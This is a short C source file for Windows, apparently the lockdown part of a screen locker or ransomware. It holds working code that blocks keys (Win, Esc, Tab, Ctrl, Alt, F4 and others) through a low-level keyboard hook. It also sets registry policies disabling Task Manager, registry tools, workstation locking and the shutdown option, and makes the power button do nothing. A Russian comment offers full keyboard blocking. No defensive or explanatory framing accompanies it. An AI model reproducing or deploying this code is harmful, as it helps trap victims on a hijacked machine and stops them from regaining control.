#include <windows.h>

static HHOOK hHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT*)lParam;
        if (k->vkCode == VK_LWIN || k->vkCode == VK_RWIN ||
            k->vkCode == VK_ESCAPE || k->vkCode == VK_TAB ||
            k->vkCode == VK_DELETE || k->vkCode == VK_F4 ||
            k->vkCode == VK_CONTROL || k->vkCode == VK_MENU ||
            k->vkCode == VK_F12 || k->vkCode == VK_F5) {
            return 1;
        }
        // return 1; // полная блокировка клавиатуры
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void install_keyboard_block(void) {
    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                              GetModuleHandleA(NULL), 0);
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
}

void disable_taskmgr(void) {
    HKEY k;
    DWORD v = 1;
    RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL);
    RegSetValueExA(k, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegSetValueExA(k, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegSetValueExA(k, "DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(k);

    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL);
    RegSetValueExA(k, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(k);
}

void block_power(void) {
    system("powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 0");
    system("powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 0");
    system("powercfg /setactive SCHEME_CURRENT");
    HKEY k;
    DWORD v = 1;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL);
    RegSetValueExA(k, "NoClose", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegSetValueExA(k, "DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(k);
}
